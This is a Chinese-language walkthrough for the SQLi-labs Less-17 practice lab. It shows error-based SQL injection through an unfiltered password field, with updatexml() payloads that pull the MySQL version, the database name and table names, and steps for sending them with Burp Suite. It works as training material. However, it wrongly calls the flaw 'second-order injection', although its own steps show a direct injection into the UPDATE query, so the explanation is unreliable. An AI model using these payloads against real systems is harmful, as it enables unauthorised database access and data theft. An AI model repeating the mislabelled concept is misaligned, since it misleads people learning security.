# Less-17 二次注入：Burp Suite 复现

### Less-17 二次注入复现指南 🛠️

Less-17 是一个典型的**二次注入**场景，核心在于用户名被过滤，而密码字段未被过滤，从而在密码更新环节触发SQL注入。以下是完整复现步骤：

---

#### 1. 环境与源码分析

- **源码逻辑**：

    1. 用户名 `$uname` 经过 `check_input()` 函数过滤，无法直接注入。

    2. 密码 `$passwd` 直接从 `$_POST` 获取，未经过滤，直接拼接到 `UPDATE` 语句中。

    3. 流程：先查询用户名是否存在 → 若存在，则用该用户名执行密码更新。

- **注入点**：密码字段（`passwd`），因为它直接进入了未过滤的 `UPDATE` 语句。

---

#### 2. 确认注入存在

1. 使用浏览器或HackBar工具，向 `Less-17` 发送POST请求：

    ```Plain Text
    
    uname=admin&passwd=123456'&submit=Submit
    ```

2. 观察响应，会出现SQL语法错误：

    ```Plain Text
    
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin' at line 1
    ```

    这证明单引号成功闭合了SQL语句，注入点存在。

---

#### 3. 报错注入获取信息

利用 `updatexml()` 函数进行报错注入，提取数据库信息。

##### 示例1：获取MySQL版本

构造密码字段payload：

```Plain Text

1' where username='admin' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+
```

完整POST数据：

```Plain Text

uname=admin&passwd=1' where username='admin' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+&submit=Submit
```

执行后，报错信息中会返回MySQL版本，如 `~8.0.30~`。

##### 示例2：获取当前数据库名

```Plain Text

1' where username='admin' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

报错信息中会显示当前数据库名，如 `~security~`。

##### 示例3：获取表名

```Plain Text

1' where username='admin' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)--+
```

通过调整 `limit` 参数，可依次获取所有表名。

---

#### 4. 使用Burp Suite复现（推荐）

1. 打开Burp Suite，开启代理，拦截浏览器发送的POST请求。

2. 修改请求体中的 `passwd` 字段为构造好的payload。

3. 发送修改后的请求，在响应中提取报错信息里的敏感数据。

---

#### 5. 关键原理

- **二次注入**：攻击者先将恶意SQL语句插入到数据库中（这里是通过密码字段），当后续程序调用该数据执行SQL操作时，恶意代码被触发。

- **报错注入**：利用MySQL的 `updatexml()` 或 `extractvalue()` 等函数，在SQL执行错误时，将查询到的敏感信息通过报错信息返回。
> （注：文档部分内容可能由 AI 生成）